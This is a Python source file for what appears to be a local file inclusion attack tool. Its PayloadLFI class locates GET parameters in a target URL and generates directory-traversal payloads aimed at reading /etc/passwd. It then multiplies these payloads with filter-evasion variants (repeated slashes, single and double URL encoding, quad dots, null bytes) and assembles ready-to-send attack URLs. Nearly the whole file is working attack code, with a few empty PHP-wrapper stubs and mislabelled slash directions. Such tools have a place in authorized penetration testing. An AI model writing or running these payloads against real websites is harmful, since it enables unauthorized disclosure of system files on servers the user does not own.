# -*- coding: utf-8 -*-
"""Example Google style docstrings.
Todo:
    * For module TODOs
    * You have to also use ``sphinx.ext.todo`` extension

Info:
    This class is used to generate payloads.
"""
import urllib.parse as urllib
from general_func import GenralFunc
from tqdm import tqdm
import sys
import time

class PayloadLFI:
    def __init__(self, para, parsed, url, php=True, asp=True, jsp=True, os="unknown", test_file="etc/passwd"):
        """
        INIT
        :param para: ['num=100', 'source=hp', 'ei=zf7VW-HgAezXgAaklrTIAw', 'q=sd', 'oq=sd']
        List of get parameters and their payloads
        :param parsed: urrlib parsed url
        :param url: url
        :param php: T/F
        :param os: Windows, linux, unkown
        :param test_file: default = /etc/passwd
        """
        self.url = url
        self.get_parameters = para
        self.parsed_url = parsed
        self.php = php
        self.test_file = test_file
        self.os = os
        self.exploit_payload_list = []
        self.exploit_payload_desc = []
        self.injection_points = []
        self.payload_counter = 0

    def generate_payloads(self):
        if self.find_injection_points(self.url):
            GenralFunc.pprint("Generating Payloads", "success")
            self.directory_transversal()
            self.double_slash()
            self.url_encode()
            self.generic_null_byte()
            self.quad_dot()

       #     for inj in range(0, len(self.injection_points)):
      #          for x in range(0, len(self.exploit_payload_desc)):
     #               GenralFunc.pprint(self.exploit_payload_desc[x], "success")
    #                GenralFunc.pprint(self.injection_points[inj].format(self.exploit_payload_list[x]), "normal")

    def double_slash(self):
        temp_payload_holder = []
        temp_payload_desc = []
        GenralFunc.pprint("Double-slash injection", "dim")
        for pay in range(0, len(self.exploit_payload_list)):
            temp = str(self.exploit_payload_list[pay])
            temp = temp.replace("/", "//")
            temp = temp.replace("\\", "\\\\")
            desc = self.exploit_payload_desc[pay] + " multiple slash filter-evasion"
            temp_payload_holder.append(temp)
            temp_payload_desc.append(desc)
        GenralFunc.pprint("Mega-slash injection", "dim")
        for pay in range(0, len(self.exploit_payload_list)):
            temp = str(self.exploit_payload_list[pay])
            temp = temp.replace("/", "///////////////////")
            temp = temp.replace("\\", "\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\")
            desc = self.exploit_payload_desc[pay] + " multiple slash filter-evasion"
            temp_payload_holder.append(temp)
            temp_payload_desc.append(desc)
        for x in range(0, len(temp_payload_holder)):
            self.exploit_payload_desc.append(temp_payload_desc[x])
            self.exploit_payload_list.append(temp_payload_holder[x])

    def quad_dot(self):
        temp_payload_holder = []
        temp_payload_desc = []
        for pay in range(0, len(self.exploit_payload_list)):
            temp = str(self.exploit_payload_list[pay])
            temp = temp.replace("..", "....")
            desc = self.exploit_payload_desc[pay] + " quad dots"
            temp_payload_holder.append(temp)
            temp_payload_desc.append(desc)
        for x in range(0, len(temp_payload_holder)):
            self.exploit_payload_desc.append(temp_payload_desc[x])
            self.exploit_payload_list.append(temp_payload_holder[x])

    def url_encode(self):
        temp_payload_holder = []
        temp_payload_desc = []
        GenralFunc.pprint("Single URL encode", "dim")
        for pay in range(0, len(self.exploit_payload_list)):
            temp = str(self.exploit_payload_list[pay])
            temp = temp.replace(".", "%2e")
            temp = temp.replace("/", "%2f")
            temp = temp.replace("\\", "%5c")
            desc = self.exploit_payload_desc[pay] + " URL encoded"
            temp_payload_holder.append(temp)
            temp_payload_desc.append(desc)

        GenralFunc.pprint("Double URL encode", "dim")
        for pay in range(0, len(temp_payload_holder)):
            temp = self.exploit_payload_list[pay]
            temp = temp.replace(".", "%252e")
            temp = temp.replace("/", "%252f")
            temp = temp.replace("\\", "%255c")
            desc = self.exploit_payload_desc[pay] + " Doubled URL encoded"
            temp_payload_holder.append(temp)
            temp_payload_desc.append(desc)
        for x in range(0, len(temp_payload_holder)):
            self.exploit_payload_desc.append(temp_payload_desc[x])
            self.exploit_payload_list.append(temp_payload_holder[x])


    def find_injection_points(self, url):
        """
        Finds the payload injection points in the URL
        :param url:
        :return: a format string
        """
        try:
            GenralFunc.pprint("Finding injection points", "dim")
            for parameter in self.get_parameters:
                name = parameter.split("=")[0]
                temp_url = url
                dupplicate_counter = len(temp_url.split(name))
                if dupplicate_counter > 2:
                    GenralFunc.pprint("Looks like their could be duplicate GET parameters in the URL: " + name + "=", "warning")
                    self.injection_points.append(temp_url.replace("&" + parameter, name + "=" + "{}"))
                else:
                    self.injection_points.append(temp_url.replace(parameter, name + "=" + "{}"))
        except IndexError:
            return -1

        return 1


    def directory_transversal(self):
        """
        Gets the parameter and adds the ../../...... etc
        :return: Appends to the payload list
        """
        GenralFunc.pprint("Generic directory transversal", "dim")
        for x in range(0, 7):
            if self.os == "windows" or self.os == "unknown":
                if x == 0:
                    temp = ("/" + self.test_file)
                    self.exploit_payload_list.append(temp)
                else:
                    temp = ((x * "../") + self.test_file)
                    self.exploit_payload_list.append(temp)
                self.exploit_payload_desc.append("Windows Generic Directory transversal with " + str(x) + " backslashes")
            if self.os == "linux" or self.os == "unknown":
                if x == 0:
                    temp = ("\\" + self.test_file)
                    self.exploit_payload_list.append(temp)
                else:
                    temp = (x * "..\\") + self.test_file
                    self.exploit_payload_list.append(temp)
                self.exploit_payload_desc.append("Linux Generic Directory transversal with " + str(x) + " backslashes")


    def display_payloads(self):
        """
        Horrible to read, just displays a progress bar and prints URL's
        :return:
        """
        iden = []
        for x in range(0, len(self.injection_points)):
            for y in range(0, len(self.exploit_payload_list)):
                iden.append(x)
        url_with_exploit = []
        try:
            for i in range(0, len(self.exploit_payload_list)*len(self.injection_points)-1):
                url_with_exploit.append(self.injection_points[iden[i]].format(self.exploit_payload_list[i]))

                to_print = self.exploit_payload_list[i]
                GenralFunc.pprint("\r" + to_print[0:120], "flush")
                time.sleep(0.0015)

            for i in tqdm(range(0, len(self.exploit_payload_list)*len(self.injection_points)-1)):
                 pass
        except IndexError:
            pass
        GenralFunc.pprint("", "dim")
        GenralFunc.pprint("Payload Generation successful", "success")
        GenralFunc.pprint("Total Payloads to be sent: " + str(len(self.exploit_payload_list)*len(self.injection_points)), "underline")

        return url_with_exploit


    def php_filter(self):
        pass

    def php_zip(self):
        pass

    def php_expect(self):
        pass

    def php_input(self):
        pass

    def php_phar(self):
        pass

    def php_fill(self):
        pass

    def generic_null_byte(self):
        """Just addes %00 to the end of the payload"""
        GenralFunc.pprint("Generic Null Byte injection", "dim")
        temp_payload_holder = []
        for payloads in self.exploit_payload_list:
            temp_payload_holder.append(payloads + "%00")
        for x in range(0, len(temp_payload_holder)):
            self.exploit_payload_list.append(temp_payload_holder[x])
            self.exploit_payload_desc.append(self.exploit_payload_desc[x] + " with null byte injection")
